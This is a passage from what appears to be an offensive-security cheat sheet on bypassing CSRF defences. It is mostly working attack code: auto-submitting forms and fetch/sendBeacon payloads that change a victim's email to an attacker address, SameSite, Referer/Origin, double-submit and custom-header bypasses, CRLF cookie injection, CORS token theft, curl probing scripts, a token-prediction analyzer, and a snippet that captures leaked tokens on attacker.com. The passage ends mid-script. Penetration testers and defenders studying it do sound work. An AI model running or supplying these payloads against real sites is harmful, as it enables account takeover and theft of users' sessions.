  <!-- multipart/form-data is a simple request type (no preflight) -->
  <form action="https://target.com/api/user/email" method="POST" 
        enctype="multipart/form-data">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Fetch with text/plain"}
  ```html [fetch-text-plain.html]
  <html>
  <body>
  <script>
  // Fetch with text/plain (simple request, no preflight)
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: JSON.stringify({
      email: 'attacker@evil.com'
    })
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Navigator.sendBeacon"}
  ```html [beacon-csrf.html]
  <html>
  <body>
  <script>
  // sendBeacon sends as text/plain with credentials
  // No preflight, bypasses CORS for POST
  var data = new Blob(
    [JSON.stringify({email: 'attacker@evil.com'})],
    {type: 'text/plain'}
  );
  navigator.sendBeacon('https://target.com/api/user/email', data);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Curl Content-Type Tests"}

  ::code-preview
  Test all content types against the endpoint.

  #code
  ```bash
  #!/bin/bash
  TARGET="https://target.com/api/user/email"
  COOKIE="session=valid_session"

  echo "[*] Content-Type Bypass Testing"

  declare -A PAYLOADS
  PAYLOADS["application/x-www-form-urlencoded"]="email=attacker@evil.com"
  PAYLOADS["text/plain"]='{"email":"attacker@evil.com"}'
  PAYLOADS["multipart/form-data; boundary=----x"]="------x\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nattacker@evil.com\r\n------x--"
  PAYLOADS["application/json"]='{"email":"attacker@evil.com"}'
  PAYLOADS["application/xml"]='<request><email>attacker@evil.com</email></request>'
  PAYLOADS["text/xml"]='<request><email>attacker@evil.com</email></request>'
  PAYLOADS["text/html"]='email=attacker@evil.com'
  PAYLOADS["application/x-www-form-urlencoded; charset=UTF-8"]="email=attacker@evil.com"
  PAYLOADS[""]="email=attacker@evil.com"

  for ct in "${!PAYLOADS[@]}"; do
    body="${PAYLOADS[$ct]}"
    if [ -z "$ct" ]; then
      echo -n "  (no Content-Type): "
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -H "Content-Type:" -d "$body" "$TARGET")
    else
      echo -n "  $ct: "
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -H "Content-Type: $ct" -d "$body" "$TARGET")
    fi
    echo "$STATUS"
  done
  ```
  ::

  :::
::

## Bypass Technique 5 — SameSite Cookie Bypass

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="SameSite=Lax GET Bypass"}
  SameSite=Lax allows cookies on top-level GET navigations. If the server accepts the action via GET (or method override), CSRF is possible.

  ```html [samesite-lax-get.html]
  <html>
  <body>
  <!-- Method 1: Top-level navigation via window.open -->
  <script>
  window.open('https://target.com/account/email?email=attacker@evil.com');
  </script>

  <!-- Method 2: Anchor click simulation -->
  <a href="https://target.com/account/email?email=attacker@evil.com" id="go">Click</a>
  <script>document.getElementById('go').click();</script>

  <!-- Method 3: Form GET submission (top-level) -->
  <form action="https://target.com/account/email" method="GET">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>

  <!-- Method 4: Location redirect -->
  <script>
  location = 'https://target.com/account/email?email=attacker@evil.com';
  </script>

  <!-- Method 5: Meta refresh -->
  <meta http-equiv="refresh" content="0;url=https://target.com/account/email?email=attacker@evil.com">
  </body>
  </html>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite=Lax + Method Override"}
  Combine GET navigation (which sends Lax cookies) with server-side method override.

  ```html [samesite-method-override.html]
  <html>
  <body>
  <!-- GET request with _method=POST override -->
  <script>
  // Rails/Laravel method override via GET
  window.location = 'https://target.com/account/email?_method=POST&email=attacker@evil.com';
  </script>
  </body>
  </html>
  ```

  ```html [samesite-header-override.html]
  <html>
  <body>
  <!-- Use form POST with method override for frameworks that support it -->
  <form action="https://target.com/account/email" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite=Lax + POST 2-Minute Window (Chrome)"}
  Chrome allows SameSite=Lax cookies on cross-site POST within 2 minutes of cookie creation for backward compatibility (Lax+POST mitigation).

  ```html [samesite-lax-post-window.html]
  <html>
  <body>
  <!--
  If the user just logged in (cookie created < 2 minutes ago),
  Chrome sends Lax cookies on cross-site POST requests.
  
  Attack scenario:
  1. Trick user into logging in (or wait for session refresh)
  2. Immediately redirect to CSRF exploit
  3. POST request carries the new session cookie
  -->

  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>
  // Submit immediately — relies on cookie being < 2 min old
  document.forms[0].submit();
  </script>
  </body>
  </html>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite=Strict — Subdomain XSS Chain"}
  SameSite=Strict prevents all cross-site requests. Bypass requires same-site context — XSS on a subdomain or sibling domain.

  ```html [samesite-strict-xss.html]
  <!--
  If you find XSS on ANY subdomain of target.com:
  blog.target.com, staging.target.com, dev.target.com, etc.
  
  The XSS executes in same-site context → SameSite=Strict cookies are sent
  -->

  <!-- On vulnerable subdomain: blog.target.com -->
  <script>
  // This runs on blog.target.com (same site as target.com)
  // SameSite=Strict cookies WILL be sent
  fetch('https://target.com/account/email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=attacker@evil.com&csrf_token=STOLEN_OR_LEAKED'
  });
  </script>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite Bypass via Scheme Switch"}
  Switching from http:// to https:// was historically treated as same-site in some browsers.

  ```html [scheme-switch.html]
  <html>
  <body>
  <!--
  HTTP page making request to HTTPS target
  In older Chrome versions, http://target.com and https://target.com
  were considered same-site (schemeless SameSite)
  -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  
  <!--
  Host this on http://anything.target.com via MitM or subdomain takeover
  Cookies with SameSite=Strict may be sent in older browser versions
  -->
  </body>
  </html>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite Bypass via Client-Side Redirect Gadget"}
  Find a client-side redirect on the target site to chain with CSRF.

  ```html [redirect-gadget.html]
  <html>
  <body>
  <!--
  If target.com has an open redirect or client-side redirect:
  https://target.com/redirect?url=/account/email?email=attacker@evil.com
  
  Top-level navigation to target.com (SameSite=Lax cookies sent)
  Then redirect processes the action
  -->
  <script>
  // Navigate to target's own redirect gadget
  window.location = 'https://target.com/redirect?url=%2Faccount%2Femail%3Femail%3Dattacker%40evil.com%26_method%3DPOST';
  </script>
  </body>
  </html>
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SameSite Bypass via Cookie Injection"}

  ```html [cookie-injection.html]
  <!--
  If you can inject cookies on a sibling subdomain (via header injection,
  CRLF injection, or subdomain XSS), you can set a session cookie
  that will be sent same-site.
  
  Example: CRLF injection on api.target.com:
  https://api.target.com/endpoint%0d%0aSet-Cookie:%20session=attacker_session;%20Domain=.target.com;%20Path=/
  
  This sets a cookie scoped to .target.com that overrides the victim's session
  Then force the victim to perform actions using the attacker's session (login CSRF)
  -->
  <script>
  // Step 1: Inject cookie via CRLF on subdomain
  var img = new Image();
  img.src = 'https://api.target.com/redirect%0d%0aSet-Cookie:%20session=ATTACKER_SESSION;%20Domain=.target.com;%20Path=/';
  
  // Step 2: After cookie injection, victim is logged in as attacker
  setTimeout(function() {
    window.location = 'https://target.com/account/link-payment';
    // Victim adds their payment method to attacker's account
  }, 2000);
  </script>
  ```
  :::
::

## Bypass Technique 6 — Referer/Origin Header Bypass

::tabs
  :::tabs-item{icon="i-lucide-code" label="Suppress Referer Header"}
  ```html [no-referer.html]
  <html>
  <head>
  <!-- Method 1: Referrer-Policy meta tag -->
  <meta name="referrer" content="no-referrer">
  </head>
  <body>

  <!-- Method 2: rel="noreferrer" on links -->
  <a href="https://target.com/account/email?email=attacker@evil.com" 
     rel="noreferrer" id="lnk">Click</a>
  <script>document.getElementById('lnk').click();</script>

  <!-- Method 3: Form with referrerpolicy -->
  <form action="https://target.com/account/email" method="POST" referrerpolicy="no-referrer">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>

  <!-- Method 4: iframe with referrerpolicy -->
  <iframe src="data:text/html,<form action='https://target.com/account/email' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>" referrerpolicy="no-referrer"></iframe>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Referer with Target Domain"}
  ```html [referer-spoof.html]
  <!--
  If server checks: "Does Referer contain target.com?"
  Include target.com in the attacker URL path/query/fragment
  -->

  <html>
  <body>
  <!--
  Host this at: https://evil.com/target.com/page
  Referer will be: https://evil.com/target.com/page
  Passes check: referer.includes('target.com')
  -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```

  ```
  Hosting strategies to embed target.com in Referer:

  1. Path:     https://evil.com/target.com/page.html
     Referer → https://evil.com/target.com/page.html ✓

  2. Query:    https://evil.com/page?ref=target.com
     Referer → https://evil.com/page?ref=target.com ✓

  3. Subdomain: https://target.com.evil.com/page.html
     Referer → https://target.com.evil.com/page.html ✓

  4. Fragment won't work (fragments not sent in Referer)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Origin Header Bypass"}
  ```html [origin-bypass.html]
  <html>
  <body>
  <!--
  Certain request types don't send Origin header:
  1. GET requests from <img>, <script>, <link> tags
  2. Requests from data: URIs (Origin: null)
  3. Requests from sandboxed iframes (Origin: null)
  4. 302 redirects (Origin may be dropped)
  -->

  <!-- No Origin header via redirect chain -->
  <form action="https://redirect-service.com/redirect?url=https://target.com/account/email" 
        method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Referer Bypass Testing"}

  ::code-preview
  Comprehensive Referer validation testing.

  #code
  ```bash
  #!/bin/bash
  TARGET="https://target.com/account/email"
  COOKIE="session=valid"
  DATA="email=attacker@evil.com"
  DOMAIN="target.com"

  echo "[*] Referer Header Bypass Testing"

  declare -A TESTS
  TESTS["No Referer"]=""
  TESTS["Empty Referer"]="Referer: "
  TESTS["Evil Referer"]="Referer: https://evil.com"
  TESTS["Target in path"]="Referer: https://evil.com/${DOMAIN}/page"
  TESTS["Target in query"]="Referer: https://evil.com/?ref=${DOMAIN}"
  TESTS["Target as subdomain"]="Referer: https://${DOMAIN}.evil.com"
  TESTS["Target prefix"]="Referer: https://evil-${DOMAIN}"
  TESTS["HTTP downgrade"]="Referer: http://${DOMAIN}"
  TESTS["Subdomain"]="Referer: https://sub.${DOMAIN}"
  TESTS["Null Referer"]="Referer: null"
  TESTS["Data URI"]="Referer: data:text/html,test"
  TESTS["About blank"]="Referer: about:blank"
  TESTS["Localhost"]="Referer: https://localhost"
  TESTS["IP address"]="Referer: https://127.0.0.1"

  for name in "${!TESTS[@]}"; do
    header="${TESTS[$name]}"
    if [ -z "$header" ]; then
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -d "$DATA" "$TARGET" 2>/dev/null)
    else
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -H "$header" -d "$DATA" "$TARGET" 2>/dev/null)
    fi
    echo "  [$STATUS] $name"
  done

  echo ""
  echo "[*] Origin Header Bypass Testing"

  ORIGIN_TESTS=(
    ""
    "Origin: null"
    "Origin: https://evil.com"
    "Origin: https://${DOMAIN}.evil.com"
    "Origin: https://evil-${DOMAIN}"
    "Origin: http://${DOMAIN}"
  )

  for origin in "${ORIGIN_TESTS[@]}"; do
    if [ -z "$origin" ]; then
      echo -n "  [No Origin] "
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -d "$DATA" "$TARGET" 2>/dev/null)
    else
      echo -n "  [$origin] "
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
        -H "$origin" -d "$DATA" "$TARGET" 2>/dev/null)
    fi
    echo "$STATUS"
  done
  ```
  ::

  :::
::

## Bypass Technique 7 — Double-Submit Cookie Bypass

::callout{icon="i-lucide-info" color="blue"}
In the double-submit pattern, the server compares a CSRF token in a cookie with the same token in the request body/header. If the cookie can be set or overridden by the attacker (via subdomain, CRLF injection, or MitM), the protection is broken.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cookie Injection via Subdomain"}
  ```html [double-submit-bypass.html]
  <html>
  <body>
  <script>
  // Step 1: Set the CSRF cookie from a controlled subdomain
  // If attacker controls any subdomain of target.com (XSS, takeover, etc.)
  // They can set a cookie for .target.com domain

  // On attacker-controlled subdomain:
  document.cookie = "csrf_token=ATTACKER_VALUE; domain=.target.com; path=/";

  // Step 2: Submit form with matching token
  setTimeout(function() {
    var form = document.createElement('form');
    form.action = 'https://target.com/account/email';
    form.method = 'POST';
    
    var email = document.createElement('input');
    email.name = 'email';
    email.value = 'attacker@evil.com';
    form.appendChild(email);
    
    var token = document.createElement('input');
    token.name = 'csrf_token';
    token.value = 'ATTACKER_VALUE'; // Matches the injected cookie
    form.appendChild(token);
    
    document.body.appendChild(form);
    form.submit();
  }, 1000);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Cookie Injection via CRLF"}
  ```html [crlf-cookie-inject.html]
  <html>
  <body>
  <script>
  // If target has CRLF injection vulnerability on any endpoint:
  // Inject Set-Cookie header to set the CSRF cookie

  var img = new Image();
  // CRLF injection in a header reflection point
  img.src = 'https://target.com/api/redirect?url=https://target.com%0d%0aSet-Cookie:%20csrf_token=ATTACKER_CSRF;%20Domain=.target.com;%20Path=/';

  setTimeout(function() {
    // Now submit with matching token
    var form = document.createElement('form');
    form.action = 'https://target.com/account/email';
    form.method = 'POST';
    form.innerHTML = '<input name="email" value="attacker@evil.com">' +
                     '<input name="csrf_token" value="ATTACKER_CSRF">';
    document.body.appendChild(form);
    form.submit();
  }, 2000);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="MitM Cookie Override"}
  ```html [mitm-double-submit.html]
  <!--
  For HTTP targets or mixed-content scenarios:
  MitM attacker can inject Set-Cookie via HTTP response
  to override the CSRF cookie, then submit matching form value
  -->

  <!--
  Step 1: MitM injects response header:
  Set-Cookie: csrf_token=MITM_VALUE; Domain=.target.com; Path=/

  Step 2: Serve this page:
  -->
  <html>
  <body>
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="MITM_VALUE">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Curl Cookie Override Test"}

  ::code-preview
  Test if server compares cookie vs body token.

  #code
  ```bash
  # Test: Set both cookie and body to same attacker value
  curl -s -o /dev/null -w "Matching custom: %{http_code}\n" \
    -X POST \
    -b "session=victim_session; csrf_token=ATTACKER_CONTROLLED" \
    -d "email=attacker@evil.com&csrf_token=ATTACKER_CONTROLLED" \
    https://target.com/account/email

  # Test: Different values in cookie vs body
  curl -s -o /dev/null -w "Mismatched: %{http_code}\n" \
    -X POST \
    -b "session=victim_session; csrf_token=COOKIE_VALUE" \
    -d "email=attacker@evil.com&csrf_token=BODY_VALUE" \
    https://target.com/account/email
  ```
  ::

  :::
::

## Bypass Technique 8 — Custom Header Bypass

::tabs
  :::tabs-item{icon="i-lucide-code" label="Flash-Based Header Injection"}
  ```html [flash-header.html]
  <!--
  Legacy bypass: Flash SWF could add custom headers cross-origin
  Still relevant for targets allowing Flash content or older browsers
  
  Modern equivalent: Find CORS misconfiguration that allows
  the custom header from attacker origin
  -->

  <!-- If CORS allows X-Requested-With from evil.com: -->
  <script>
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: 'email=attacker@evil.com'
  });
  // This requires CORS preflight to allow X-Requested-With from evil.com
  // If CORS is misconfigured → bypass
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PDF Embed Header Injection"}
  ```html [pdf-header.html]
  <!--
  PDF files served from target domain can make requests with custom headers.
  Upload a crafted PDF to target.com that includes JavaScript.
  The PDF executes in the target's origin context.
  -->

  <!--
  Step 1: Craft malicious PDF with embedded JavaScript
  Step 2: Upload to target.com (avatar, document, etc.)
  Step 3: PDF JS makes authenticated requests with custom headers
  -->

  <!-- Trigger PDF execution -->
  <embed src="https://target.com/uploads/malicious.pdf" 
         type="application/pdf" 
         width="1" height="1">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="CORS Chain for Custom Headers"}
  ```html [cors-chain-header.html]
  <html>
  <body>
  <script>
  // If CORS allows Origin: evil.com with custom headers:
  // Access-Control-Allow-Headers: X-CSRF-Token, X-Requested-With

  // Step 1: Steal CSRF token via CORS
  fetch('https://target.com/api/user/profile', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Step 2: Use stolen token in custom header
    return fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': data.csrf_token,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Header Bypass Testing"}

  ::code-preview
  Test if custom header requirement can be bypassed.

  #code
  ```bash
  #!/bin/bash
  TARGET="https://target.com/api/user/email"
  COOKIE="session=valid"
  DATA='{"email":"attacker@evil.com"}'

  echo "[*] Custom Header Bypass Testing"

  # Without X-Requested-With
  echo -n "  No X-Requested-With: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: application/json" \
    -d "$DATA" "$TARGET"
  echo ""

  # With X-Requested-With
  echo -n "  With X-Requested-With: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d "$DATA" "$TARGET"
  echo ""

  # Without custom CSRF header
  echo -n "  No X-CSRF-Token header: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: application/json" \
    -d "$DATA" "$TARGET"
  echo ""

  # With empty custom header
  echo -n "  Empty X-CSRF-Token: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: " \
    -d "$DATA" "$TARGET"
  echo ""

  # Use form submission (no custom headers possible)
  echo -n "  Form POST (no custom headers): "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=attacker@evil.com" "$TARGET"
  echo ""

  # text/plain (simple request, no preflight)
  echo -n "  text/plain body: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "Content-Type: text/plain" \
    -d "$DATA" "$TARGET"
  echo ""
  ```
  ::

  :::
::

## Bypass Technique 9 — Token Prediction & Cryptographic Weakness

::collapsible

```python [csrf-token-analyzer.py]
#!/usr/bin/env python3
"""Analyze CSRF token patterns for predictability"""

import requests
import re
import sys
import hashlib
import base64
import json
from collections import Counter
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class TokenAnalyzer:
    def __init__(self, target, cookies, count=50):
        self.target = target
        self.count = count
        self.session = requests.Session()
        self.session.verify = False
        for c in cookies.split(';'):
            k, v = c.strip().split('=', 1)
            self.session.cookies.set(k, v)
        self.tokens = []

    def collect_tokens(self):
        """Collect multiple CSRF tokens"""
        print(f"[*] Collecting {self.count} tokens...")
        patterns = [
            r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)',
            r'"csrfToken"\s*:\s*"([^"]+)',
            r'"_csrf"\s*:\s*"([^"]+)',
        ]
        
        for i in range(self.count):
            resp = self.session.get(self.target)
            for pattern in patterns:
                match = re.search(pattern, resp.text)
                if match:
                    token = match.group(1)
                    self.tokens.append({
                        'value': token,
                        'time': datetime.now().isoformat(),
                        'index': i,
                        'length': len(token)
                    })
                    break
        
        print(f"[+] Collected {len(self.tokens)} tokens")
        return self.tokens

    def analyze_patterns(self):
        """Analyze token characteristics"""
        if not self.tokens:
            return
        
        values = [t['value'] for t in self.tokens]
        lengths = [t['length'] for t in self.tokens]
        
        print("\n[*] TOKEN ANALYSIS")
        print("=" * 60)
        
        # Length analysis
        print(f"\n  Lengths: {set(lengths)}")
        if len(set(lengths)) == 1:
            print(f"  → Fixed length: {lengths[0]}")
        else:
            print(f"  → Variable lengths detected (unusual)")
        
        # Character set
        all_chars = set(''.join(values))
        print(f"\n  Character set ({len(all_chars)} unique): {''.join(sorted(all_chars)[:50])}")
        
        if all_chars <= set('0123456789abcdef'):
            print("  → HEX encoding detected")
        elif all_chars <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='):
            print("  → Base64 encoding detected")
            for v in values[:3]:
                try:
                    decoded = base64.b64decode(v)
                    print(f"    Decoded: {decoded[:60]}")
                except:
                    pass
        
        # Uniqueness
        unique = len(set(values))
        print(f"\n  Unique tokens: {unique}/{len(values)}")
        if unique == 1:
            print("  \033[91m→ STATIC TOKEN! Bypass: use same token for all requests\033[0m")
        elif unique < len(values):
            dupes = Counter(values).most_common(5)
            print(f"  → Duplicates found: {dupes}")
            print("  \033[91m→ Token reuse detected! May not be per-request\033[0m")
        
        # Sequential analysis
        if all(c in '0123456789' for c in ''.join(values)):
            ints = [int(v) for v in values]
            diffs = [ints[i+1] - ints[i] for i in range(len(ints)-1)]
            if len(set(diffs)) <= 3:
                print(f"  \033[91m→ SEQUENTIAL TOKENS! Differences: {set(diffs)}\033[0m")
                print(f"  → Next predicted: {ints[-1] + diffs[-1]}")
        
        # Timestamp detection
        for v in values[:3]:
            for encoding in [v, v[:10], v[-10:]]:
                try:
                    ts = int(encoding)
                    if 1600000000 < ts < 2000000000:
                        dt = datetime.fromtimestamp(ts)
                        print(f"  \033[91m→ TIMESTAMP DETECTED: {dt}\033[0m")
                except:
                    pass
        
        # Entropy calculation
        import math
        for v in values[:1]:
            freq = Counter(v)
            entropy = -sum((c/len(v)) * math.log2(c/len(v)) for c in freq.values())
            print(f"\n  Entropy: {entropy:.2f} bits per char")
            if entropy < 3.0:
                print("  \033[91m→ LOW ENTROPY - potentially predictable\033[0m")
            elif entropy > 4.5:
                print("  → Good entropy - likely cryptographically random")
        
        # Check if token is derived from session
        session_cookie = self.session.cookies.get('session', '')
        if session_cookie:
            for v in values[:1]:
                if hashlib.md5(session_cookie.encode()).hexdigest() in v:
                    print("  \033[91m→ Token derived from MD5(session)!\033[0m")
                if hashlib.sha1(session_cookie.encode()).hexdigest() in v:
                    print("  \033[91m→ Token derived from SHA1(session)!\033[0m")
                if hashlib.sha256(session_cookie.encode()).hexdigest() in v:
                    print("  \033[91m→ Token derived from SHA256(session)!\033[0m")

        # Sample tokens
        print(f"\n  Sample tokens:")
        for t in self.tokens[:5]:
            print(f"    [{t['index']}] {t['value']}")

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/account/settings'
    cookies = sys.argv[2] if len(sys.argv) > 2 else 'session=valid'
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 50
    
    analyzer = TokenAnalyzer(target, cookies, count)
    analyzer.collect_tokens()
    analyzer.analyze_patterns()
```

::

## Bypass Technique 10 — JSON Endpoint CSRF

::tabs
  :::tabs-item{icon="i-lucide-code" label="Form text/plain to JSON"}
  ```html [json-csrf-text.html]
  <html>
  <body>
  <!--
  Many JSON APIs don't check Content-Type strictly.
  HTML forms can only send: form-urlencoded, multipart, text/plain
  Using text/plain, we craft a JSON-like body
  -->

  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <!-- The name becomes the key, = is between, value follows -->
    <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
  </form>
  <script>document.forms[0].submit();</script>

  <!--
  Body sent: {"email":"attacker@evil.com","x":"="}
  Content-Type: text/plain
  If server parses body as JSON regardless of Content-Type → CSRF
  -->
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Fetch text/plain (no preflight)"}
  ```html [json-csrf-fetch.html]
  <html>
  <body>
  <script>
  // text/plain is a "simple" Content-Type — no CORS preflight
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: JSON.stringify({
      email: 'attacker@evil.com'
    })
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="XHR with application/x-www-form-urlencoded"}
  ```html [json-csrf-xhr.html]
  <html>
  <body>
  <script>
  // Some JSON endpoints also accept form-urlencoded
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://target.com/api/user/email', true);
  xhr.withCredentials = true;
  // application/x-www-form-urlencoded is a simple Content-Type
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('{"email":"attacker@evil.com"}');
  // Some frameworks parse the raw body regardless of Content-Type
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Multipart Boundary Trick"}
  ```html [json-csrf-multipart.html]
  <html>
  <body>
  <script>
  // multipart/form-data is a simple request type
  // Craft boundary to inject JSON content
  var body = '------boundary\r\n' +
    'Content-Disposition: form-data; name="json"\r\n' +
    'Content-Type: application/json\r\n\r\n' +
    '{"email":"attacker@evil.com"}\r\n' +
    '------boundary--';

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://target.com/api/user/email', true);
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=----boundary');
  xhr.send(body);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="sendBeacon JSON"}
  ```html [json-csrf-beacon.html]
  <html>
  <body>
  <script>
  // sendBeacon with Blob — sends text/plain by default
  var blob = new Blob(
    [JSON.stringify({email: 'attacker@evil.com'})],
    {type: 'text/plain'}
  );
  navigator.sendBeacon('https://target.com/api/user/email', blob);

  // Alternative: application/x-www-form-urlencoded blob
  var blob2 = new Blob(
    [JSON.stringify({email: 'attacker@evil.com'})],
    {type: 'application/x-www-form-urlencoded'}
  );
  navigator.sendBeacon('https://target.com/api/user/email', blob2);
  </script>
  </body>
  </html>
  ```
  :::
::

## Bypass Technique 11 — Token Fixation & Reuse

::tabs
  :::tabs-item{icon="i-lucide-code" label="Static Token (No Rotation)"}
  ```html [static-token.html]
  <html>
  <body>
  <!--
  If CSRF token doesn't change between sessions or requests:
  Attacker logs in, grabs their token, uses it forever
  -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Static token that never rotates -->
    <input type="hidden" name="csrf_token" value="STATIC_TOKEN_VALUE_THAT_NEVER_CHANGES">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Per-Session Token Reuse"}
  ```html [session-token-reuse.html]
  <!--
  If token is per-session but not per-request:
  1. Use one valid token for multiple requests
  2. Token from one form works on another form
  -->

  <html>
  <body>
  <script>
  // Token from /account/settings form used on /account/password form
  // If same token works across different actions → bypass
  var TOKEN = 'VALID_TOKEN_FROM_ANY_FORM';
  
  // Action 1: Change email
  var form1 = document.createElement('form');
  form1.action = 'https://target.com/account/email';
  form1.method = 'POST';
  form1.innerHTML = '<input name="email" value="attacker@evil.com">' +
                    '<input name="csrf_token" value="' + TOKEN + '">';
  document.body.appendChild(form1);
  
  // Submit via iframe to avoid navigation
  var iframe = document.createElement('iframe');
  iframe.name = 'f1';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  form1.target = 'f1';
  form1.submit();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Token Leakage via Referer"}
  ```html [token-leak-referer.html]
  <!--
  If CSRF token appears in URL (GET parameter or query string),
  it leaks via the Referer header when user clicks external links
  
  Example: https://target.com/settings?csrf_token=SECRET_VALUE
  
  If page contains external images/links, the token leaks
  -->

  <!-- Step 1: Find if token appears in any URL -->
  <!-- Check browser history, proxy logs for tokens in URLs -->

  <!-- Step 2: If token is in Referer logs of attacker's site -->
  <html>
  <body>
  <!-- Host page with external resources to capture Referer -->
  <img src="https://attacker.com/capture-referer.gif">
  
  <!--
  Server-side capture:
  Referer: https://target.com/settings?csrf_token=LEAKED_VALUE
  -->
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Reuse Testing"}

  ::code-preview
  Test if token can be reused across requests and endpoints.

  #code
  ```bash
  #!/bin/bash
